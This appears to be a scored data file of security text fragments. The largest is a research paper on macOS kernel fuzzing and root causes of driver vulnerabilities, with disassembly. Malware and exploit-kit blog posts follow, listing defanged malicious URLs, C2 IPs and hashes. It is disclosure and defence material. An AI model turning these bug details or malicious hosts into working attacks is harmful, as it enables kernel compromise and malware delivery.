AppleHDAEngineUserClient::getStateAction(UserClientData)",0.01645588204702375
P-Diff: entry functions for function AppleHDAPathSet::isAmplifierGainAdjustable(),0.009092642975362164
"AppleHDAEngineUserClient::getHardwareVolume()
AppleHDAEngineUserClient::getStateAction(UserClientData)
AppleHDAEngineUserClient::setHardwareVolume()
AppleHDAEngineUserClient::setStateAction(UserClientData)",0.018923979542989633
P-Diff: entry functions for function AppleHDAPathSet::isAmplifierMuteCapable(),0.008930194491986065
"AppleHDAEngineUserClient::setSpatialChannelMute()
AppleHDAEngineUserClient::setStateAction(UserClientData)",0.014984475702670252
Table 5: User-mode entry points for changed functions in AppleHDA.kext.,0.011866613189413622
3. Dynamic analysis for kernel attack interface,0.007927940072197548
"As we have mentioned before, the key methodology for dynamic analysis is to get the runtime context of the attack interface API in order to help trigger, fuzz or even reproduce the potential vulnerability.",0.0118356477234558
"As our best practice, we would choose Frida to control and trace user-mode context and Dtrace to trace the kernel counterpart. As a manual alternative, debugging (via lldb) both the user and kernel is reasonable.",0.01317356991604679
Table 6 shows a basic comparison of different typical dynamic traces according to difference dimensions.,0.023135801175407256
User trace,0.008254421112480648
Kernel trace,0.009053307395508026
Embedded in OS,0.006406835823784318
Any privilege?,0.013477835995521548
Support script?,0.012316630605515244
Performance,0.010198414176772252
Platform,0.009311670764370561
Frida,0.008224094876241095
Yes,0.01036843159928702
No,0.008317834830532389
No,0.008317834830532389
Root or Repack,0.008364657056357139
Yes,0.01036843159928702
Middle,0.009386624948948485
iOS/OSX,0.008590145063670396
Dtrace,0.010404796865828403
No,0.008317834830532389
Yes,0.01036843159928702
Yes,0.01036843159928702
Root,0.006975733187695621
Yes,0.01036843159928702
High,0.008656107455393913
OSX,0.007683047130313536
lldb,0.008573370887776544
Yes,0.01036843159928702
Yes,0.01036843159928702
Yes,0.01036843159928702
Root,0.006975733187695621
Yes,0.01036843159928702
Low,0.007886397487317232
iOS/OSX,0.008590145063670396
Kernel hook,0.007864864424652507
---,0.022044597930796273
Yes,0.01036843159928702
No,0.008317834830532389
Root,0.006975733187695621
No,0.008317834830532389
Middle,0.009386624948948485
OSX,0.007683047130313536
Table 6: Comparison of dynamic traces.,0.017490151374997875
3.1 Frida hook in user mode,0.007609336941105771
Figure 25: Frida hook in user mode.,0.015818904277953516
"Frida is one of the most popular dynamic instrumentation toolkits on many platforms including MacOS and iOS. One of its advantages is that it allows you to peek at and control every function using well documented JavaScript APIs which include the pre and post event handling. Typically, the retrieved runtime information includes call stack backtrace, thread context, return value, and any other you define. Take the xpc_connection_send_message API context for example, as shown in Listing 3.",0.016122555549715534
"{""time"":""2017-09-18T10:38:32.807Z"",
""txnType"":""moony?"",
""lib"":""libxpc.dylib"",
""method"":""xpc_connection_send_message"",
""artifact"":[{
""name"":""connection"",
""value"":""0x1658d090"",""argSeq"":0}, {""name"":""connectioninfo"",""value"":""\tconnection=0x1658d090\tconnectionName=\tconnectionPid=231
\tconnectionProcName=Preferences"",""argSeq"":0},
{""name"":""retval"",""value"":374477440,""argSeq"":-1}
]}",0.013433295820557412
Listing 3: Xpc_connection_send_message API.,0.015287790248928457
"As the basic steps to use Frida, first launch the Frida server under root privilege or repack the Frida gadget in the target application, then you can develop your own JavaScript code for hooking any API you want in the Frida controller. The trace log generated by the Frida server is sent to the Frida controller for further analysis via USB or network.",0.011539730238604662
3.2 Dtrace in kernel mode,0.009159696765284275
Figure 26: Dtrace architecture. (Source: Solaris Dynamic Tracing Guide.),0.01770969974320824
"Dtrace has one the best tracing designs, with high performance and usability in Unix-like systems including OSX (unfortunately, Dtrace is not officially supported on iOS devices), as can be seen from the architecture shown in Figure 26.",0.014574338521529895
"Dtrace also provides multiple probes embedded in the kernel with categories such as sysinfo, syscall, fbt, sdt and so on. The typical system call, IOKit, mach msg, network, disk and file are almost all covered by Dtrace probes. Figure 27 shows the Dtrace providers list.",0.012917848489865436
Figure 27: Dtrace providers list.,0.014256883436147061
"What is more, D language (*.d) in script provides fruitful APIs to intercept pre or post event (e.g. BEGIN,END) and keywords related to runtime process context (e.g. PID, timestamp, filename, exe name and so on). Thus you can see the code pieces for the IOFile probe. Figure 28 shows the Dtrace script for file probe.",0.015454527280977626
Figure 28: Dtrace script for file probe.,0.014750705988116786
3.3 Misc,0.008005675781925903
"Another useful dynamic trace tool is lldb embedded in OSX and iOS systems. Besides typical debugging utilities such as single step, break point, memory read/write operations and thread info, lldb can debug any user-mode service or process and even the whole OSX kernel. Lldb also supports python script to wrap the typical lldb-related objects (e.g. thread, process, module, memory, lldb attach) and operation with good documentation. In fact, we not only traced the API sequences we are interested in dynamically, but we also fuzzed the kernel to reproduce lots of kernel crashes, details of which will be announced in another paper.",0.014756362019977654
4. Enhanced passive fuzzing solution,0.008482253656255767
"We want some kind of enhanced OSX/iOS kernel fuzzing system, which is currently under development since we know the technical details of the kernel interface APIs from the viewpoint of static and dynamic analysis.",0.013026886385057779
"As the key methodology for fuzzing, we would like to touch as much of the execution path (code coverage) as possible and also catch the first spot of the kernel crash.",0.014220618352299375
"The first step of fuzzing is to try to generate a fruitful corpus of kernel interface APIs and call the kernel from the user agent. Besides blind fuzzing using tools like Trinity, we recommend using normal programs which have more opportunities to interact with kernels than the agent. For example, playing 3D games that use openGL or graphics drivers, operating peripheral devices (e.g. Wi-Fi, Bluetooth management), and so on. These kinds of real kernel API call could eventually touch ‘deeper’ kernel code execution paths because the legal input parameters have already bypassed most trick kernel checks.",0.012619117807366242
"As the second step, the passive fuzzer intercepts the typical API in the kernel counterpart usually as an inline hook for pre and post event handling. By fuzzing the input data of the API parameter (usually as buffer content of an argument, or kernel/user shared memory) in special time strategy, you could probably get plenty of kernel crashes.",0.017364635776293658
"The kernel sanitizer mechanism (such as KASAN, kernel address sanitizer) could be useful for improving the quantity and quality of fuzzing. Without a sanitizer mechanism, a crash caused by a memory corruption vulnerability may be handled or dismissed by the kernel code itself. What is more, there would exist instruction sequence disorder between the root cause point and the final instruction pointed to by RIP in one crash, which could cost more analysis effort for researchers.",0.015060570971341947
Figure 29: Enhanced kernel fuzz.,0.01794574332122656
4.1 KASAN in iOS/OSX kernel,0.008644606105629338
KASAN (kernel address sanitizer) is one of the standard sanitizers supported by popular operating systems including OSX which could help catch the crash spot so as to identify the root cause of the vulnerability and reproduce it much more easily.,0.011829231790893013
"What is lucky is that the KASAN feature is officially supported in XNU building, so you could build your own XNU kernel like this and replace the original in /System/Library/Kernels/:",0.008890671384681137
make SDKROOT=macosx ARCH_CONFIGS=X86_64 KERNEL_CONFIGS=”KASAN”,0.011214354806876936
"In fact, as the implementation of KASAN in XUN uses extra memory for tracing, it would guard any memory address allocating, freeing and referencing (e.g. memcpy, memcpy, bcopy) in the source code at instruction level such as variable in stack, heap and so on. In this way, the typical memory error such as buffer (stack, heap) overflow and UAF (use after free) in XUN could be caught in the first crash spot. Figure 30 shows the code pieces in __Xio_connect_method in the kernel.",0.01232396683435888
Figure 30: KASAN in __Xio_connect_method.,0.012192118455748635
4.2 Inline hook and fuzz in kernel,0.008465401751531765
"As we have mentioned, we want to touch as much of the execution path (code coverage) as possible. In our experience, the typical kernel API could be one of the best hooking points, which contains IOKit control, memory share, mach msg method and system call.",0.010711407215085345
"When the CPU executes instructions to this kind of kernel API, many routine checks (e.g. send correct message id to the correct user client) have been made, which could reduce the useless blind fuzzing corpus and save fuzzing time.",0.015637407553513394
"Besides simple tampering with the input data, we could introduce a more advanced fuzzing method at this point. As part of our further research, we could locate our agent in kernel mode towards the kernel API and support code coverage feedback by static or dynamic instrumentation. You could imagine it as syzkaller or AFL in kernel mode.",0.014015798476490593
4.3 Future plan,0.00886084259702935
4.3.1 Syzkaller-like fuzzing in kernel mode,0.0076826739433251134
"As we know, the runtime environment in the kernel would be complex. There would exist much environment preparation or initialization (e.g. open the correct service, initialize the target devices and send the correct mach message id) before a special kernel API (e.g. IOConnectionCallMethod) could work properly. So why don’t we intercept the kernel API at the proper time under the proper state and fuzz it like AFL does, directly in kernel mode?",0.016402629089069976
4.3.2 Porting KASAN/KMSAN for a closed-source driver,0.00849309175866042
"In fact, porting a kernel sanitizer mechanism to a closed-source driver on iOS/OSX is possible if we want expand the memory guard for the whole kernel mode. Every kernel module (including driver) would utilize the memory management service provided by the kernel via API (e.g. kmem_alloc, bcopy). Modifying the memory API to asan_* in the import table in the driver module, or patching the code with memory management in the driver to support the kernel sanitizer could be investigated in further research.",0.013791184676157586
5. Hunt for 0-day vulnerabilities,0.006653856797362412
5.1 CVE-2018-4462 – an integer overflow vulnerability which can leak kernel information found in the AMDFramebuffer driver,0.005322632163761165
"Figure 31 is a backtrace of the crash point. The extGetPixelInformation() method is one of the IOFramebufferUserClient methods whose selector is 1. This method takes three scalar data inputs, which are displayMode, depth and aperture, and returns the pixel information.",0.01057843122700941
Figure 31: Backtrace of the integer overflow.,0.015755947848755114
5.1.1 Root cause,0.005142742714288606
"Figure 32 is an assembly snippet of the crash point which is in the method AMDFramebuffer::getPixelInformationFromTiming(AtiDetailedTimingInformation const&, IOPixelInformation*, int, int). From the code snippet and the debug info, we can see that the register ‘rdi = 0xfffffffff2000001’ is so big it is out of boundary. And after this buffer read operation, this function use the ‘Utilities::str_copy’ function to copy ‘sizeof(IOPixelInformation*)’ bits of pixel information to the caller, so it can leak the kernel information to the user-mode process.",0.01583616624841111
Figure 32: Code snippet for the crash point.,0.015152044619359928
5.2 Untrusted pointer de-reference issue found in IntelAccelerator,0.005828006221020976
"Figure 33 shows the backtrace of this untrusted pointer de-reference issue. This vulnerability can be triggered on Mac mini. ‘IntelAccelerator’ is a service delivered by the Intel graphics driver, it can be opened from a user-mode process.",0.008991255308030466
Figure 33: Crash info for the intelAccelerator driver NULL PAGE read operation.,0.01493348006763584
5.2.1 Root cause,0.005119059957019778
"Figure 34 shows the arguments list for the ‘newUserClient’ function when this service is opened. When connection type is 6 and the properties are NULL, this vulnerability will be triggered.",0.008747778080862356
Figure 34: Arguments list for newUserClient function when this bug is triggered.,0.01089288782530684
5.3 OverFlow issue due to no boundary check in IOUSBFamily extension,0.005965913442339987
The IOUSBFamily driver provides an external method for a user-mode process which is called IOUSBFamily`IOUSBInterfaceUserClient::LowLatencyPrepareBuffer. This function can be called by IOConnectCallMethod with selector 17. Figure 35 shows the backtrace of the crash point.,0.014004102245797623
Figure 35: Backtrace for the crash point.,0.018000195075302372
5.3.1 Root cause,0.005094530127889962
"A capacity argument is needed for this function. The IOUSBInterfaceUserClient::_LowLatencyPrepareBuffer function will copy the input_scalar[0~4] data for the IOUSBFamily`IOUSBInterfaceUserClient::LowLatencyPrepareBuffer function directly. But the input scalar content is transferred from user space, so we can control the capacity to a large degree to trigger this bug.",0.008880130610918302
5.4 Divide zero issue found in AMDRadeonX4000_AMDAccelResource class,0.006693891285202924
"IOAccelCommandQueue is used to process the graphic accelerator command information for 3D rendering. This vulnerability occurred in selector 1 whose function name is ‘IOAccelCommandQueue::s_submit_command_buffers’ with open type 9. When an AMDRadeonX4000 driver processes these command, it will prepare the AMDAccelResource first. However, there are many divide operations in this process, and a lack of zero checking.",0.006762746709810696
These vulnerabilities were found in the latest MacOS (10.14.3) system. Listing 4 shows the backtrace of this bug.,0.010076036549877654
5.4.1 Root cause,0.005074776493357969
"Listing 5 shows an assembly code snippet of this vulnerable function. The r12d register is initialized with zero. It will be assigned a new value within the omitted code if it meets some condition, but this is not certain, therefore, it will result in a divide zero bug in the place b.",0.010426249646680708
"__text:00000000000BB75B                 div     esi
__text:00000000000BB75D                 mov     r14d, 0
__text:00000000000BB763                 mov     r12d, 0          -----init r12d with 0                                 --(a)
__text:00000000000BB769                 test    edx, edx
…..
-----omitted code ----
…..
__text:00000000000BB93C loc_BB93C:                              ; CODE XREF: BltMgr::HwlOptimizeBufferBltRects(BltInfo *,uint)+3E1j
__text:00000000000BB93C                 xor     edx, edx
__text:00000000000BB93E                 mov     eax, r13d
__text:00000000000BB941                 div     r12d                -----r12d is not always nonzero              ---(b)
__text:00000000000BB944                 cmp     eax, r14d
__text:00000000000BB947                 jbe     short loc_BB95B
__text:00000000000BB949                 mov     dword ptr [rsi+rbx-0Ch], 0
__text:00000000000BB951                 mov     [rsi+rbx-4], r12d
__text:00000000000BB956                 mov     eax, r14d
__text:00000000000BB959                 jmp     short loc_BB97C",0.016753549532040002
Listing 5: Asm code snippet of the BltMgr::HwlOptimizeBufferBltRects function.,0.014260276424727492
5.5 OOB read in AMDRadeonX4000 extension,0.006566637161483091
"AMDRadeonX4000_AMDAccelResource is used to process the graphic accelerator resource information for 3D rendering. This vulnerability occurred in selector 0, whose function name is ‘IOAccelSharedUserClient2::s_new_resource’ with open type 6. This vulnerability was found in the latest MacOS (10.14.3) system.",0.006409210933085774
Listing 6 shows the backtrace of this OOB bug.,0.015344993119058348
"* thread #1, stop reason = signal SIGSTOP
* frame #0: 0xffffff7fa00965d3 AMDRadeonX4000'AMDRadeonX4000_AMDAccelResource::initialize(IOAccelNewResourceArgs*, unsigned long long) + 1525
frame #1: 0xffffff7f9fea346b IOAcceleratorFamily2'IOAccelSharedUserClient2::new_resource(IOAccelNewResourceArgs*, IOAccelNewResourceReturnData*, unsigned long long, unsigned int*) + 1893
frame #2: 0xffffff7f9fea4a41 IOAcceleratorFamily2
'IOAccelSharedUserClient2::s_new_resource
(IOAccelSharedUserClient2*, void*, IOExternalMethodArguments*) + 151
frame #3: 0xffffff801d625ab8 kernel.development'IOUserClient::externalMethod(this=<unavailable>, selector=<unavailable>, args=0xffffff83dd4b3b58, dispatch=0xffffff7f9fee8260, target=0xffffff80854fd780, reference=0x0000000000000000) at IOUserClient.cpp:5358 [opt]
frame #4: 0xffffff7f9fea4d98 IOAcceleratorFamily2'IOAccelSharedUserClient2::externalMethod(unsigned int, IOExternalMethodArguments*, IOExternalMethodDispatch*, OSObject*, void*) + 120
frame #5: 0xffffff801d62eb7f kernel.development'::
is_io_connect_method(connection=0xffffff80854fd780, selector=0,
scalar_input=<unavailable>, scalar_inputCnt=<unavailable>, inband_input=<unavailable>, inband_inputCnt=2424, ool_input=0, ool_input_size=0, inband_output="""", inband_outputCnt=0xffffff806ba03e0c, scalar_output=0xffffff83dd4b3ce0, scalar_outputCnt=0xffffff83dd4b3cdc, ool_output=0, ool_output_size=0xffffff8085919d5c) at IOUserClient.cpp:3994 [opt]
frame #6: 0xffffff801cfbbce4 kernel.development'_Xio_connect_method(InHeadP=<unavailable>, OutHeadP=0xffffff806ba03de0) at device_server.c:8379 [opt]
frame #7: 0xffffff801ce8d27d kernel.development'ipc_kobject_server(request=0xffffff8085919000, option=<unavailable>) at ipc_kobject.c:359 [opt]
frame #8: 0xffffff801ce59465 kernel.development'ipc_kmsg_send(kmsg=0xffffff8085919000, option=3, send_timeout=0) at ipc_kmsg.c:1832 [opt]
frame #9: 0xffffff801ce78a75 kernel.development'mach_msg_overwrite_trap(args=<unavailable>) at mach_msg.c:549 [opt]
frame #10: 0xffffff801cff6323 kernel.development'mach_call_munger64(state=0xffffff806ca9c480) at bsd_i386.c:573 [opt]
frame #11: 0xffffff801ce23486 kernel.development'hndl_mach_scall64 + 22",0.01614859765638388
Listing 6: The backtrace of this OOB bug.,0.016417466989538054
5.5.1 Root cause,0.005114676133001095
"As shown in Listing 7, the register of rax is the address of the buffer which is created from the IOMalloc function. The r15 register points to the structureInput buffer which is controlled by user mode. The ecx register stores the length of the IOMalloc buffer. The rdx register is used as an index to copy the structureInput buffer content to the IOMalloc buffer. However, here, ecx is obtained directly from user mode which is structureInput at offset 62 dword. So, if we set ecx to a high value, it will read overflow from the structureInput buffer.",0.015060502624816285
"__text:000000000000E58E loc_E58E:            ; CODE XREF: AMDRadeonX4000_AMDAccelResource::initialize(IOAccelNewResourceArgs *,ulong long)+58Dj
__text:000000000000E58E                 mov     ecx, [r15+0F8h]
__text:000000000000E595                 test    rcx, rcx
__text:000000000000E598                 jz      short loc_E603
__text:000000000000E59A                 shl     rcx, 3
__text:000000000000E59E                 lea     rdi, [rcx+rcx*2]
__text:000000000000E5A2                 call    _IOMalloc
__text:000000000000E5A7                 mov     [r12+178h],
rax  --- rax== buffer address which create by IOMalloc
__text:000000000000E5AF                 test    rax, rax
__text:000000000000E5B2                 jz      short loc_E62A
__text:000000000000E5B4                 or      byte ptr [r12+186h], 8
__text:000000000000E5BD                 mov
ecx,
[
r15
+0F8h]
--------r15==structureInput, ecx=( (uint32_t*) structureInput+62)
__text:000000000000E5C4                 mov     [r12+180h], ecx
__text:000000000000E5CC
test    rcx, rcx
__text:000000000000E5CF                 jz      short loc_E639
__text:000000000000E5D1                 xor     edx, edx
__text:000000000000E5D3
__text:000000000000E5D3 loc_E5D3:          ; CODE XREF: AMDRadeonX4000_AMDAccelResource::initialize(IOAccelNewResourceArgs *,ulong long)+621j
__text:000000000000E5D3                 mov     rsi, [r15+
rdx
+98h]
---- mov structureInput+rdx+0x98 to rsi
__text:000000000000E5DB                 mov     [rax+
rdx
], rsi
----mov rsi to rax+rdx, rax== buffer address which create by IOMalloc
__text:000000000000E5DF                 mov     rsi, [r15+
rdx
+0A0h]
__text:000000000000E5E7                 mov     [rax+
rdx
+8], rsi
__text:000000000000E5EC                 mov     esi, [r15+
rdx
+0A8h]
__text:000000000000E5F4                 mov     [rax+
rdx
+10h], esi
__text:000000000000E5F8
add     rdx, 18h
__text:000000000000E5FC                 dec     rcx
__text:000000000000E5FF                 jnz     short loc_E5D3",0.02143347913352822
Listing 7: Asm code snippet of AMDRadeonX4000_AMDAccelResource::initialize.,0.01231451303692721
References,0.0158494738281566
[1] Angr. https://github.com/angr/angr.,0.011354060072156447
[2] Miasm. https://github.com/cea-sec/miasm.,0.011682600613177274
[3] ARM Architecture Reference Manual. https://cs.nyu.edu/courses/spring18/CSCI-GA.2130-001/ARM/arm_arm.pdf.,0.012921508626490552
[4] Joker. http://www.newosxbook.com/tools/joker.html.,0.012573638398234555
"[5] CodeRefsFrom(ea, flow). https://www.hex-rays.com/products/ida/support/idapython_docs/idautils-module.html#CodeRefsFrom.",0.010606424718757834
[6] BinDiff. https://www.zynamics.com/bindiff.html.,0.011908631408251158
[7] Meld. http://meldmerge.org/.,0.014158397095515918
"[8] iOS Security Guide. https://images.apple.com/business/docs/iOS_Security_Guide.pdf.
",0.01324846475033259
"Magnitude EK Malvertising Déjà Vu
During the past few days we have witnessed an increase in the number of malvertising incidents involving the Magnitude exploit kit. The last time we blogged about this was in mid November 2015 and we attributed the event to the fact that Magnitude EK had just integrated a newer Flash exploit (CVE-2015-7645).
We fast-forward a few months and see that things haven’t changed one bit:",0.015039251618721772
"Same ad network (Propeller Ads Media)
Newer Flash exploit (CVE-2015-8651)
CryptoWall",0.008603745097239046
We see the use of “redirectors” which obfuscate the URL to Magnitude:,0.008893314150107079
Traffic flow:,0.007728910759789098
Flash exploit: (blocked by Malwarebytes Anti-Exploit),0.010176736708140122
CryptoWall: (blocked by Malwarebytes Anti-Ransomware Beta),0.013712562645191273
"While reviewing this attack, we also spotted a similar malvertising attack via another ad network (AdsTerra):",0.015059677488693413
"We reported both campaigns to the respective ad networks.
IOCs:
Ad networks:",0.00873095841446736
"terraclicks[.]com
onclickads[.]net",0.010062974147376669
Redirectors:,0.008193686925999755
"discount-shop[.]org
freewellgames[.]biz
onlinewellgame[.]com
mov-3s[.]com",0.013377301274372089
"Payload (CryptoWall): e5c3fa1f1b22af46bf213ed449f74d40
",0.008558936022920127
"Continuing their well proven social engineering tactic of impersonating the market leading courier services, cybercriminals are currently mass mailing tens of thousands of emails impersonating UPS, in an attempt to trick users into clicking on the malicious links found in the legitimate-looking emails.
Once they click on the links, they’re automatically exposed to the client-side exploits served by the Black Hole Exploit kit.
More details:",0.014360833586935962
Sample screenshot of the spamvertised email:,0.010990132234593664
"Sample spamvertised compromised URLs:
hxxp://www.aberdyn.fr/letter.htm
hxxp://www.aberdyn.fr/osc.htm
Sample client-side exploits serving URLs:
hxxp://apendiksator.ru:8080/forum/links/column.php
hxxp://sectantes-x.ru:8080/forum/links/column.php
Sample malicious payload dropping URL:
hxxp://sectantes-x.ru:8080/forum/links/column.php?uvt=0a04070634&wvqi=33&yrhsb=3307093738070736060b&vjppc=02000200020002
Client-side exploits served: CVE-2010-0188
Although we couldn’t reproduce the client-side exploitation taking place through these domains in the time of posting this analysis, we know that on 2012-09-27 one of the domains (sectantes-x.ru) also served client-side exploits, and dropped a particular piece of malware – MD5: 9f86a132c0a5f00705433632879a20b9 – detected by 27 out of 42 antivirus scanners as Trojan-Ransom.Win32.PornoAsset.abup.
Upon execution, the sample phones back to the following command and control servers:
178.77.76.102 (AS20773)
91.121.144.158 (AS16276)
213.135.42.98 (AS15396)
207.182.144.115 (AS10297)
More MD5s are known to have phoned back to the same IPs:
MD5: 7515448fa3aa1ee585311b80dab7ca87 – detected by 38 out of 44 antivirus scanners as Worm:Win32/Cridex.E
MD5: 92978246ab42f68c323c36e62593d4ee – detected by 31 out of 43 antivirus scanners as HEUR:Trojan.Win32.Invader
MD5: 19f481447e1adf70245582d4f4f5719c – detected by 40 out of 43 antivirus scanners as Worm:Win32/Cridex.E
MD5: 62825338329b0fa9f3ec8cc282154760 – detected by 41 out of 44 antivirus scanners as Worm:Win32/Cridex.E
MD5: 1b97e4021dc75a8cd8854aa61984dd44 – detected by 34 out of 43 antivirus scanners as Worm:Win32/Cridex.E
MD5: e09f719b6dde74972a810979812fdc01 – detected by 42 out of 46 antivirus scanners as Worm:Win32/Cridex.E
Malicious domain name reconnaissance:
apendiksator.ru – 91.224.135.20; 187.85.160.106; 210.71.250.131
Name server: ns1.apendiksator.ru – 62.76.186.24
Name server: ns2.apendiksator.ru – 110.164.58.250
Name server: ns3.apendiksator.ru – 42.121.116.38
Name server: ns4.apendiksator.ru – 41.168.5.140
sectantes-x.ru
Name server: ns1.sectantes-x.ru – 62.76.46.195
Name server: ns2.sectantes-x.ru – 87.120.41.155
Name server: ns3.sectantes-x.ru – 132.248.49.112
Name server: ns4.sectantes-x.ru – 91.194.122.8
Name server: ns5.sectantes-x.ru – 62.76.188.246
Responding to these IPs (91.224.135.20; 187.85.160.106; 210.71.250.131) are also the following malicious domains:
bunakaranka.ru – 91.224.135.20
afjdoospf.ru – 91.224.135.20
angelaonfl.ru – 91.224.135.20
akionokao.ru – 91.224.135.20
apendiksator.ru – 91.224.135.20
bilainkos.ru – 91.224.135.20
Name servers participating in the campaign’s infrastructure:
Name server: ns1.bunakaranka.ru – 62.76.186.24
Name server: ns2.bunakaranka.ru – 110.164.58.250
Name server: ns3.bunakaranka.ru – 42.121.116.38
Name server: ns4.bunakaranka.ru – 41.168.5.140
Name server: ns1.afjdoospf.ru – 62.76.186.24
Name server: ns2.afjdoospf.ru – 110.164.58.250
Name server: ns3.afjdoospf.ru – 42.121.116.38
Name server: ns4.afjdoospf.ru – 41.168.5.140
Name server: ns1.angelaonfl.ru – 62.76.186.24
Name server: ns2.angelaonfl.ru – 110.164.58.250
Name server: ns3.angelaonfl.ru – 42.121.116.38
Name server: ns4.angelaonfl.ru – 41.168.5.140
Name server: ns1.akionokao.ru – 62.76.186.24
Name server: ns2.akionokao.ru – 110.164.58.250
Name server: ns3.akionokao.ru – 42.121.116.38
Name server: ns4.akionokao.ru – 41.168.5.140
Name server: ns1.apendiksator.ru – 62.76.186.24
Name server: ns2.apendiksator.ru – 110.164.58.250
Name server: ns3.apendiksator.ru – 42.121.116.38
Name server: ns4.apendiksator.ru – 41.168.5.140
Name server: ns1.bilainkos.ru – 62.76.186.24
Name server: ns2.bilainkos.ru – 110.164.58.250
Name server: ns3.bilainkos.ru – 42.121.116.38
Name server: ns4.bilainkos.ru – 41.168.5.140
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.012509249846555548
"Win32/Cridex: Java pushes Cyprus into a Blackhole
Banking crisis in Cyprus is now being used in a spam campaign promoting the Blackhole exploit kit and the Win32/Cridex Trojan.",0.014350105334990149
20 Mar 2013 - 02:10PM,0.011903510416266694
Banking crisis in Cyprus is now being used in a spam campaign promoting the Blackhole exploit kit and the Win32/Cridex Trojan.,0.015345392650676026
[Update: hat tip to Kafeine for pointing out that we cited the wrong CVE number. Now corrected in the text.],0.011065413961401038
"Sadly, Cyprus has been the source of bad news lately. Even sadder, nothing travels faster than bad news, and bad people are all too ready to use bad news to trick their victims into opening bad files. My colleague Aleksandr Matrosov has alerted us to a spammed out message crammed with malicious links. Here’s a screenshot:",0.012236567456739178
"Despite the apparently innocuous nature of the links, they actually all go to a site booby-trapped with the Blackhole exploit kit (hxxp://go-my.ru/cyprus_news.html). The page is detected by ESET as a phishing site and users are protected.",0.012460758068562172
The malware uses the latest Java exploit CVE-2013-0431 and we detect the samples as Win32/Cridex.AA and Java/Exploit.Agent.NMK.,0.014152509489764764
"Following infection of the victim machine, the victim is redirected to the main BBC news page:",0.009238480502526625
"As you see, the story there isn’t quite as dramatic as the spam message implies, but of course the idea is to grab your attention and get you to click on a malicious link.",0.01531557250594029
The malware’s payload is to drop Win32/Cridex (see  Virus Radar for a map of Win32/Cridex). We are now on notice that unsolicited emails about the problems in Cyprus are to be treated with extreme caution.,0.017271666965531396
"Aleksandr Matrosov, Security Intelligence Team Lead
David Harley, Senior Research Fellow
",0.010944321477920571
Up2Date 8.003 Released,0.007883787471227977
"An Up2Date was released today for Astaro Security Gateway Version 8. This Up2Date is designed to improve the stability of your V8 installation, offers some security patches, and acts as the new target landing version for appliance users who one-touch upgrade to ASG V8 via the 7.508 Up2Date which will be released next week. At that time full details around the appliance upgrade process will be published, and we'll have an update on the progress of the 8.100 Beta & GA as well.",0.011299892071466755
"Written by
Angelo Comazzetto",0.008855311348334505
"November 11, 2010",0.009812056707460104
Network up2date,0.007611986957109407
"An Up2Date was released today for Astaro Security Gateway Version 8. This Up2Date is designed to improve the stability of your V8 installation, offers some security patches, and acts as the new target landing version for appliance users who one-touch upgrade to ASG V8 via the 7.508 Up2Date which will be released next week. At that time full details around the appliance upgrade process will be published, and we’ll have an update on the progress of the 8.100 Beta & GA as well.",0.009558204343426024
"8.003 provides some fixes for those who will upgrade to ASG V8 from V7, and another set  of fixes to address some security advisories in bzip2 and ClamAV.
*Note: Users of a previous, pre-GA ""soft-release"" of this 8.003 should re-apply this Up2Date to resolve issues with Anti-Spam daemon restarts and importing V7 backups into V8 installations which have HA configured. (See the forums if you need help with this)
Details
Remarks:
* Your system will be rebooted",0.009248600753516412
"News:
* Fixed: bzip2 vulnerability (CVE-2010-0405)
Fixes:
ID15395: UTF-8 Characters in IPSec PSK kill MiddleWare
ID14710: installation of customer license failed without a error
ID15480: Astaro: DiskCache::set() dies if key contains wide characters
ID15243: Update ClamAV
Download Information
MD5Sum: 0087e2c97e42c17f36b62987ad682ca8
Size: 24,270,749 Bytes (24MB)
Link: ftp://ftp.astaro.de/Astaro_Security_Gateway/v8/up2date/u2d-sys-8.003.tgz.gpg
The ASG V8.000 release notes can be found here.
Astaro Up2Date technology makes it easy to upgrade your Astaro  Security Gateway to the latest version. There are two ways to apply an  Up2Date package to the system:",0.00957760815321429
"Log on to WebAdmin, navigate to Management >> Up2Date   >> Overview and use Update to latest version now to install the   Firmware Up2Date. Click on the ""Watch Up2Date Progress in new window""   and an extra browser window will show the progress of the Up2Date   installation. (The System administrator will receive a notification   email once the Up2Date process has finished.)
Download the Up2Date package from our HTTP or FTP Server and install it under Management >> Up2Date >> Advanced:",0.011976908437992817
Astaro ASG Up2Date Download Mirrors:,0.007728065315596222
"Astaro US
Astaro US2
Astaro Germany
Astaro Germany2",0.013094484610568724
Feedback,0.009067519666800083
"If you want to provide feedback or want to discuss any of the ASG V8 features you should post it on our User Bulletin Board. Please indicate the version you are using (e.g. ""[8.003] Web Application Security Question"").
If you have any feedback on our help, manual, or any documentation (Online Help) please send it to docu@astaro.com.
There is also a demo server for public use: http://demo.astaro.com",0.014589461396054992
"Regards,
Angelo Comazzetto
Astaro Product Manager",0.012076391533347941
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"World‑Cup Malware: the Kick‑Off
Looking into their crystal balls (no jokes, please) at the end of 2009, our colleagues in Latin America came up with a prophecy that was later incorporated into a white paper (2010: Cybercrime Coming of Age): In June 2010, one of the most popular regular sports events, the soccer World Cup, will take place in",0.017886404850522286
26 Mar 2010 - 09:06AM,0.01192048044319316
"Looking into their crystal balls (no jokes, please) at the end of 2009, our colleagues in Latin America came up with a prophecy that was later incorporated into a white paper (2010: Cybercrime Coming of Age): In June 2010, one of the most popular regular sports events, the soccer World Cup, will take place in",0.018956623260063754
"Looking into their crystal balls (no jokes, please) at the end of 2009, our colleagues in Latin America came up with a prophecy that was later incorporated into a white paper (2010: Cybercrime Coming of Age):",0.01582782553680695
"In June 2010, one of the most popular regular sports events, the soccer World Cup, will take place in South Africa. We can expect that this will be a widely exploited topic in social engineering attacks, due to the great interest it will inspire in many users.",0.016515296987012595
"Well, we did also say:",0.017109675177431338
"A very common use of social engineering in the context of malware is to attract the attention of the potential victim sitting in front of the computer. A particularly effective way of achieving this is to make use of topics that have importance in people’s lives, or which currently preoccupy the media, or even to invent eye-catching stories..",0.012104209639498431
